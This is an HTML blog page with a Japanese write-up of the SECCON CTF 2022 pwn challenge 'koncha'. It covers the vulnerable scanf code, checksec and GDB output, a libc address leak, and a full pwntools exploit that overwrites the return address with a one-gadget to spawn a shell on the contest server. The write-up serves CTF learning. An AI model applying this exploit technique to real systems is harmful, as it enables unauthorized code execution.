@@ -1,0 +1,175 @@
+<!doctype html><html lang=en dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  SECCON CTF 2022 Writeup &lsquo;koncha&rsquo;[pwn]
+  #
+
+2022年11月に開催されたSECCON2022予選に参加しました．
+おそらく日本で一番有名かつ大規模なCTF大会ということもあり，非常に面白い問題（そして難しい問題）が多く，
+競技時間の24時間は必死に問題に取り組むことができ楽しかったです．
+本記事では，競技時間中にFLAGを見つけることができたpwnの問題についてメモを残します．
+
+  問題
+  #
+
+
+
+
+	
+	
+	
+	
+
+
+tar.gzファイルを展開すると，問題のC言語ファイル，バイナリ，libc，ローカル実行環境構築用のDockerfileなどがあります．
+
+  解法
+  #
+
+C言語ファイルの重要な部分を抜き出すと，以下のようになります．
+name, country変数を定義して，1回目のscanfでnameに入力値を格納，printfでnameを出力．
+2回目のscanfでcountryに入力値を格納，printfでcountryを出力するという非常にシンプルなプログラムです．
+int main() {
+  char name[0x30], country[0x20];
+
+  scanf("%[^\n]s", name);
+  printf("Nice to meet you, %s!\n", name);
+  scanf("%s", country);
+  printf("Wow, %s is such a nice country!\n", country);
+  return 0;
+}
+また，各種セキュリティ機構は以下のようになっています．64bitでcanaryなし，PIE (Position Independent Executables) ありです．
+$ checksec ./chall
+[*] &#39;chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+このプログラムの脆弱性は，2回行われるscanfに入力文字数の制限がないことです．
+これにより，スタックオーバーフローを起こすことができます．'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/posts/seccon2022/"><meta property="og:site_name" content="k-taka"><meta property="og:title" content="SECCON CTF 2022 Writeup 'koncha'[pwn]"><meta property="og:description" content='SECCON CTF 2022 Writeup ‘koncha’[pwn] # 2022年11月に開催されたSECCON2022予選に参加しました． おそらく日本で一番有名かつ大規模なCTF大会ということもあり，非常に面白い問題（そして難しい問題）が多く， 競技時間の24時間は必死に問題に取り組むことができ楽しかったです．
+本記事では，競技時間中にFLAGを見つけることができたpwnの問題についてメモを残します．
+問題 # tar.gzファイルを展開すると，問題のC言語ファイル，バイナリ，libc，ローカル実行環境構築用のDockerfileなどがあります．
+解法 # C言語ファイルの重要な部分を抜き出すと，以下のようになります．
+name, country変数を定義して，1回目のscanfでnameに入力値を格納，printfでnameを出力． 2回目のscanfでcountryに入力値を格納，printfでcountryを出力するという非常にシンプルなプログラムです．
+int main() { char name[0x30], country[0x20]; scanf("%[^\n]s", name); printf("Nice to meet you, %s!\n", name); scanf("%s", country); printf("Wow, %s is such a nice country!\n", country); return 0; } また，各種セキュリティ機構は以下のようになっています．64bitでcanaryなし，PIE (Position Independent Executables) ありです．
+$ checksec ./chall [*] &#39;chall&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled このプログラムの脆弱性は，2回行われるscanfに入力文字数の制限がないことです． これにより，スタックオーバーフローを起こすことができます．'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:modified_time" content="2022-11-16T02:44:16+09:00"><title>SECCON CTF 2022 Writeup 'koncha'[pwn] | k-taka</title>
+<link rel=icon href=http://localhost:1313/favicon.png><link rel=manifest href=http://localhost:1313/manifest.json><link rel=canonical href=http://localhost:1313/posts/seccon2022/><link rel=stylesheet href=http://localhost:1313/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=http://localhost:1313/fuse.min.js></script><script defer src=http://localhost:1313/en.search.min.43ac1410281d6401802182199ac5b7b703523217e77c1b125307dbd3dd0c9bb9.js integrity="sha256-Q6wUECgdZAGAIYIZmsW3twNSMhfnfBsSUwfb090Mm7k=" crossorigin=anonymous></script><script defer src=http://localhost:1313/sw.min.88f1afdaf4798d7d3520420dcfe201f928c3d371fdedfc3ae28cd9b6b79544f8.js integrity="sha256-iPGv2vR5jX01IEINz+IB+SjD03H97fw64ozZtreVRPg=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=http://localhost:1313/><span>k-taka</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul class=book-languages><li><input type=checkbox id=languages class=toggle>
+<label for=languages class="flex justify-between"><a role=button class="flex align-center"><img src=http://localhost:1313/svg/translate.svg class=book-icon alt=Languages>
+English</a></label><ul><li><a href=http://localhost:1313/ru/>Russian</a></li><li><a href=http://localhost:1313/zh/>Chinese</a></li></ul></li></ul><ul><li><a href=https://github.com/alex-shpak/hugo-book target=_blank rel=noopener>Github</a></li><li><a href=https://themes.gohugo.io/hugo-book/ target=_blank rel=noopener>Hugo Themes</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=http://localhost:1313/svg/menu.svg class=book-icon alt=Menu></label><h3>SECCON CTF 2022 Writeup 'koncha'[pwn]</h3><label for=toc-control><img src=http://localhost:1313/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#seccon-ctf-2022-writeup-konchapwn>SECCON CTF 2022 Writeup &lsquo;koncha&rsquo;[pwn]</a><ul><li><a href=#問題>問題</a></li><li><a href=#解法>解法</a></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2>SECCON CTF 2022 Writeup 'koncha'[pwn]</h2><div class=book-post-content><h1 id=seccon-ctf-2022-writeup-konchapwn>SECCON CTF 2022 Writeup &lsquo;koncha&rsquo;[pwn]
+<a class=anchor href=#seccon-ctf-2022-writeup-konchapwn>#</a></h1><p>2022年11月に開催されたSECCON2022予選に参加しました．
+おそらく日本で一番有名かつ大規模なCTF大会ということもあり，非常に面白い問題（そして難しい問題）が多く，
+競技時間の24時間は必死に問題に取り組むことができ楽しかったです．</p><p>本記事では，競技時間中にFLAGを見つけることができたpwnの問題についてメモを残します．</p><h2 id=問題>問題
+<a class=anchor href=#%e5%95%8f%e9%a1%8c>#</a></h2><a href=http://localhost:1313/posts/seccon2022/seccon2022-koncha.png><img src=http://localhost:1313/posts/seccon2022/seccon2022-koncha_hu_3d8169b1277747b.png alt=koncha></a><p>tar.gzファイルを展開すると，問題のC言語ファイル，バイナリ，libc，ローカル実行環境構築用のDockerfileなどがあります．</p><h2 id=解法>解法
+<a class=anchor href=#%e8%a7%a3%e6%b3%95>#</a></h2><p>C言語ファイルの重要な部分を抜き出すと，以下のようになります．</p><p><code>name</code>, <code>country</code>変数を定義して，1回目のscanfでnameに入力値を格納，printfでnameを出力．
+2回目のscanfでcountryに入力値を格納，printfでcountryを出力するという非常にシンプルなプログラムです．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> name[<span style=color:#ae81ff>0x30</span>], country[<span style=color:#ae81ff>0x20</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%[^</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>]s&#34;</span>, name);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Nice to meet you, %s!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, name);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>scanf</span>(<span style=color:#e6db74>&#34;%s&#34;</span>, country);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Wow, %s is such a nice country!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, country);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>また，各種セキュリティ機構は以下のようになっています．64bitでcanaryなし，PIE (Position Independent Executables) ありです．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec ./chall
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;chall&#39;</span>
+</span></span><span style=display:flex><span>    Arch:     amd64-64-little
+</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
+</span></span><span style=display:flex><span>    Stack:    No canary found
+</span></span><span style=display:flex><span>    NX:       NX enabled
+</span></span><span style=display:flex><span>    PIE:      PIE enabled
+</span></span></code></pre></div><p>このプログラムの脆弱性は，2回行われるscanfに入力文字数の制限がないことです．
+これにより，スタックオーバーフローを起こすことができます．</p><p>exploitの方針としては，以下のようになります．</p><ol><li>1回目のscanfとprintfでlibcアドレスのリークを行う．</li><li>2回目のscanfでスタックオーバーフローの脆弱性を用いてmain関数のリターンアドレスを書き換えて，one gadgetに飛ばす．</li></ol><p>libcアドレスのリークについては，1回目の入力で何も入力せずにEnterキーを押すと，スタック上に配置されているアドレスらしき文字列が表示されました．
+（?Rhの部分がリークしているアドレスです．ASCIIで対応する文字がないので文字化けみたいになってますね）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./chall
+</span></span><span style=display:flex><span>Hello! What is your name?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nice to meet you, �Rh!
+</span></span></code></pre></div><p>表示された文字は，16進数で表現すると<code>0x7ffff7fab2e8</code>のようなアドレスになっています．（実行するたびに値は変わります．）
+GDBで見てみると，このアドレスはどうやらlibcの<code>__exit_funcs_lock</code>という部分を指しているようです．（データ領域かな？）</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gdb-peda$ pdisas 0x00007ffff7fab2e8
+</span></span><span style=display:flex><span>   0x00007ffff7fab2e8 &lt;__exit_funcs_lock+0&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2ea &lt;__exit_funcs_lock+2&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2ec:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2ee:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2f0 &lt;__wctomb_state+0&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2f2 &lt;__wctomb_state+2&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2f4 &lt;__wctomb_state+4&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2f6 &lt;__wctomb_state+6&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2f8:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2fa:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2fc:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab2fe:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab300 &lt;__libc_drand48_data+0&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab302 &lt;__libc_drand48_data+2&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab304 &lt;__libc_drand48_data+4&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span><span style=display:flex><span>   0x00007ffff7fab306 &lt;__libc_drand48_data+6&gt;:	add    BYTE PTR <span style=color:#f92672>[</span>rax<span style=color:#f92672>]</span>,al
+</span></span></code></pre></div><p>リークできたアドレスから，libcアドレスのベースを求めて，さらにone gadgetのアドレスも計算しておきます．</p><p>ここまでのコードを以下に書きます</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>  <span style=color:#75715e># pwntools</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ↓gdbでexit_functions_lockとlibcのベースアドレスをメモして，オフセットを計算しとく</span>
+</span></span><span style=display:flex><span>offset_exit_functions_lock <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7ffff7fab2e8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x7ffff7dba000</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ↓one_gadgetコマンドで取得</span>
+</span></span><span style=display:flex><span>offset_og <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xe3b01</span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sock <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./bin/chall&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># exit_functions_lockアドレスをリーク</span>
+</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recvline() <span style=color:#75715e># b&#39;Hello! What is your name?\n&#39;</span>
+</span></span><span style=display:flex><span>sock<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Nice to meet you, &#34;</span>) <span style=color:#75715e># Nice to meet you, </span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># リークしたアドレスを頑張ってintに変換</span>
+</span></span><span style=display:flex><span>low <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>high <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>exit_funcs_lock <span style=color:#f92672>=</span> unpack(low) <span style=color:#f92672>+</span> unpack(high) <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100000000</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> exit_funcs_lock <span style=color:#f92672>-</span> offset_exit_functions_lock    <span style=color:#75715e># libcベースアドレスの計算</span>
+</span></span><span style=display:flex><span>og_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> offset_og                             <span style=color:#75715e># one gadgetアドレスの計算</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># デバッグのために，リークしたアドレス，計算したアドレスを表示</span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;exit_funcs_lock&#34;</span>, hex(exit_funcs_lock))
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;libc_base&#34;</span>, hex(libc_base))
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;libc_one_gadget&#34;</span>, hex(og_addr))
+</span></span></code></pre></div><p>one gadgetアドレスがわかったので，後はret2libcするだけです．</p><p>2回目のscanfでスタックオーバーフローができるので，main関数のリターンアドレスに，先ほど計算したone gadgetアドレスを入れます．
+scanfで入力した文字列の先頭から，main関数のリターンアドレスまでのオフセットは88バイトだったので，88バイト分適当な文字を入れてパディングしています．</p><p>最終的なexploitコードは以下のようになります．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>offset_exit_functions_lock <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x7efec96482e8</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x7efec9457000</span>
+</span></span><span style=display:flex><span>offset_og <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xe3b01</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sock <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;koncha.seccon.games&#39;</span>, <span style=color:#ae81ff>9001</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recvline() <span style=color:#75715e># b&#39;Hello! What is your name?\n&#39;</span>
+</span></span><span style=display:flex><span>sock<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;Nice to meet you, &#34;</span>)
+</span></span><span style=display:flex><span>low <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>)
+</span></span><span style=display:flex><span>high <span style=color:#f92672>=</span> sock<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00\x00</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>exit_funcs_lock <span style=color:#f92672>=</span> unpack(low) <span style=color:#f92672>+</span> unpack(high) <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x100000000</span>
+</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> exit_funcs_lock <span style=color:#f92672>-</span> offset_exit_functions_lock
+</span></span><span style=display:flex><span>og_addr <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> offset_og
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;exit_funcs_lock&#34;</span>, hex(exit_funcs_lock))
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;libc_base&#34;</span>, hex(libc_base))
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;libc_one_gadget&#34;</span>, hex(og_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 2回目のscanfでret書き換え</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>88</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(og_addr)
+</span></span><span style=display:flex><span>sock<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sock<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><p>exploitコードの接続先をremoteに置き換えて実行すると，問題サーバ側でシェルが起動して対話形式になります．</p><p><code>ls</code>コマンドを打つと<code>flag-50d....txt</code>が表示されているので，<code>cat</code>コマンドでファイルの中身を表示すると，FLAGを見つけることができました．</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 solve.py
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Opening connection to koncha.seccon.games on port 9001: Done
+</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Hello! What is your name?\n&#39;</span>
+</span></span><span style=display:flex><span>b<span style=color:#e6db74>&#39;Nice to meet you, &#39;</span>
+</span></span><span style=display:flex><span>exit_funcs_lock 0x7f58018cf2e8
+</span></span><span style=display:flex><span>libc_base 0x7f58016de000
+</span></span><span style=display:flex><span>libc_one_gadget 0x7f58017c1b01
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
+</span></span><span style=display:flex><span>!
+</span></span><span style=display:flex><span>Which country <span style=color:#66d9ef>do</span> you live in?
+</span></span><span style=display:flex><span>Wow, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style=color:#ae81ff>\x</span>1b|X<span style=color:#ae81ff>\x</span>7f is such a nice country!
+</span></span><span style=display:flex><span>Itls
+</span></span><span style=display:flex><span>chall
+</span></span><span style=display:flex><span>flag-50d05c4f3e767dfc58f5cde347c36370.txt
+</span></span><span style=display:flex><span>$
+</span></span></code></pre></div></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/alex-shpak/hugo-book/commit/973fd1ea2e2dcd2f8ec5ed7de1b5de954a6da229 title='Last modified by takashimakazuki | November 16, 2022' target=_blank rel=noopener><img src=http://localhost:1313/svg/calendar.svg class=book-icon alt>
+<span>November 16, 2022</span></a></div><div><a class="flex align-center" href=https://github.com/alex-shpak/hugo-book/edit/main/exampleSite/content/posts/seccon2022/index.md target=_blank rel=noopener><img src=http://localhost:1313/svg/edit.svg class=book-icon alt>
+<span>Edit this page</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#seccon-ctf-2022-writeup-konchapwn>SECCON CTF 2022 Writeup &lsquo;koncha&rsquo;[pwn]</a><ul><li><a href=#問題>問題</a></li><li><a href=#解法>解法</a></li></ul></li></ul></nav></div></aside></main></body></html>
